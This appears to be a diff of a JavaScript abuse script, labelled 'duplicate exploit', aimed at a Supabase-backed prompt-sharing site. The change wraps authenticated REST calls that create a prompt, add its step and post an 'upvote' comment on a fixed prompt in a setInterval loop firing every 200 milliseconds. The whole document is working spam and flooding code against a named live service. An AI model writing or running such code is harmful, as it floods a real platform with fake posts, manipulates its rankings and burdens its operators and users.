@@ -40,55 +40,58 @@
         });
 
         // duplicate exploit
-        fetch('https://naxnmptbuycolotkwvsz.supabase.co/rest/v1/prompts?select=id', {
-            method: 'POST',
-            headers: {
-                apikey: api_key,
-                Authorization: 'Bearer ' + access_token,
-                'Content-Type': 'application/json',
-                Prefer: 'return=representation'
-            },
-            body: JSON.stringify({
-                title: NEW_POST.title,
-                description: NEW_POST.description,
-                author_id: author_id,
-                parent_prompt_id: null,
-                step_count: 1,
-                model_id: 'model'
-            })
-        })
-        .then(res => res.json())
-        .then(data => {
-            const prompt_id = data[0].id;
-            fetch('https://naxnmptbuycolotkwvsz.supabase.co/rest/v1/prompt_steps?columns="step_type","content","step_order","prompt_id"', {
+        setInterval(() => {
+            fetch('https://naxnmptbuycolotkwvsz.supabase.co/rest/v1/prompts?select=id', {
                 method: 'POST',
                 headers: {
                     apikey: api_key,
                     Authorization: 'Bearer ' + access_token,
-                    'Content-Type': 'application/json'
+                    'Content-Type': 'application/json',
+                    Prefer: 'return=representation'
                 },
-                body: JSON.stringify([
-                    {
-                        step_type: 'prompt',
-                        content: NEW_POST.prompt,
-                        step_order: 1,
-                        prompt_id: prompt_id
-                    }
-                ])
-            });
-        });
-        fetch("https://naxnmptbuycolotkwvsz.supabase.co/rest/v1/comments?select=*", {
-            method: "POST",
-            headers: {
-                "apikey": api_key,
-                "Authorization": "Bearer "+access_token,
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                prompt_id: "6895e12a-4342-4e6d-bc39-6c679adba400",
-                author_id: author_id,
-                body: "upvote"
+                body: JSON.stringify({
+                    title: NEW_POST.title,
+                    description: NEW_POST.description,
+                    author_id: author_id,
+                    parent_prompt_id: null,
+                    step_count: 1,
+                    model_id: 'model'
+                })
             })
-        });
+            .then(res => res.json())
+            .then(data => {
+                const prompt_id = data[0].id;
+                fetch('https://naxnmptbuycolotkwvsz.supabase.co/rest/v1/prompt_steps?columns="step_type","content","step_order","prompt_id"', {
+                    method: 'POST',
+                    headers: {
+                        apikey: api_key,
+                        Authorization: 'Bearer ' + access_token,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify([
+                        {
+                            step_type: 'prompt',
+                            content: NEW_POST.prompt,
+                            step_order: 1,
+                            prompt_id: prompt_id
+                        }
+                    ])
+                });
+            });
+            fetch("https://naxnmptbuycolotkwvsz.supabase.co/rest/v1/comments?select=*", {
+                method: "POST",
+                headers: {
+                    "apikey": api_key,
+                    "Authorization": "Bearer "+access_token,
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    prompt_id: "6895e12a-4342-4e6d-bc39-6c679adba400",
+                    author_id: author_id,
+                    body: "upvote"
+                })
+            });
+
+        }, 200)
     }
 })();
